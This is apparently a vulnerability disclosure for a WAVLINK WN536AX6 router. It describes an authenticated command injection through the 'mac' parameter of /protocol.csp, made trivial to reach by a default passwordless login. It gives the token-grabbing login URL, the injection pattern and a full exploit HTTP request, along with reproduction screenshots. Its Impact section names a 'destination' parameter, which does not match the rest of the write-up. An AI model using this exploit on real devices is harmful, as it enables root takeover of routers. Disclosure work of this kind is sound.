# WAVLINK WN536AX6



- Vendor: WAVLINK
- Product: WN536AX6
- Firmware Version: V260507
- Vulnerability Type:Authenticated Command Injection

# Description

​		An authenticated command injection vulnerability exists in the host_black handler of /protocol.csp on the WAVLINK WN536AX6-A router. The vulnerability can be exploited through the attacker-controlled mac parameter, leading to remote code execution with root privileges. Although a valid session token is required for exploitation, authentication can be trivially bypassed: the device ships with FirstLogin=1 (passwordless login enabled by default), allowing an attacker to obtain a valid token with a single unauthenticated login request.

#   Impact

An authenticated attacker can inject arbitrary shell commands through the `destination` parameter and execute them with the privileges of the web service, potentially resulting in full compromise of the device.

#   Vulnerability Details

In the ioos web backend, within the host_black handler of /protocol.csp (fname=net&opt=host_black&function=set), the request parameter mac is not sanitized before being directly concatenated into the shell command setup_bannet_list.sh add \"%s\", which is then executed via system(). Under the device's factory default configuration (FirstLogin=1, which enables passwordless authentication), an attacker needs only two steps to obtain a root shell: first, send a request to fname=system&opt=login&function=set&usrid= to retrieve a session token; then, with the token, access the injection payload mac=aa" | <arbitrary command> #, which triggers the execution of arbitrary commands with root privileges.

<img width="737" height="109" alt="图片" src="https://github.com/user-attachments/assets/8791e444-a08c-49a5-9428-ab14ce8e2ef7" />


<img width="1026" height="670" alt="图片" src="https://github.com/user-attachments/assets/f4bca85a-347c-4d40-a304-f7fefed5619f" />




Obtain the token, then perform the exploit.

http://192.168.10.3/protocol.csp?fname=system&opt=login&function=set&usrid=

<img width="1206" height="224" alt="图片" src="https://github.com/user-attachments/assets/31151a26-d0bb-4991-9383-c7d9de61c512" />


**Obtain the token, then exploit the vulnerability.**

**exp**

```http
GET /protocol.csp?fname=net&opt=host_black&function=set&mac=aa%22%20%7C%20touch%20%2Fbannet_ax6%20%23&devname=dev&index=1&token=AF1F0B2C37186B9640E8DED882A6D8A7 HTTP/1.1

Host: 192.168.10.3

Cookie: i18next=en_US

Sec-Ch-Ua: "Not_A Brand";v="8", "Chromium";v="120"

Accept: application/json, text/javascript, */*; q=0.01

X-Requested-With: XMLHttpRequest

Sec-Ch-Ua-Mobile: ?0

User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.71 Safari/537.36

Sec-Ch-Ua-Platform: "Linux"

Sec-Fetch-Site: same-origin

Sec-Fetch-Mode: cors

Sec-Fetch-Dest: empty

Referer: https://192.168.10.3/

Accept-Encoding: gzip, deflate, br

Accept-Language: en-US,en;q=0.9

Priority: u=1, i

Connection: close




```

# **Reproduction Results**

<img width="1176" height="179" alt="图片" src="https://github.com/user-attachments/assets/4c5fdc0e-0296-4314-b984-f9ced004ba69" />

<img width="1320" height="721" alt="图片" src="https://github.com/user-attachments/assets/59f7c35c-b525-47b4-8d11-b6961e739d96" />

<img width="1439" height="499" alt="图片" src="https://github.com/user-attachments/assets/125d3742-ef4b-4975-b398-b0e98ef07bb7" />

